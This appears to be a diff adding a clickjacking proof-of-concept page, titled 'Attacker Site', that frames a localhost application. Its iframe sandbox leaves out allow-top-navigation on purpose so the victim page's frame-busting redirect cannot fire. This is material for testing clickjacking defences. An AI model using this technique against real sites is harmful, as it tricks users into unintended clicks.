@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attacker Site</title>
+</head>
+<body>
+    <h1>Clickjacking Attempt</h1>
+    <!-- allow-top-navigation is MISSING, preventing frame busting redirect -->
+    <iframe id="victim-frame" src="http://localhost:4000/" width="800" height="600" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+</body>
+</html>
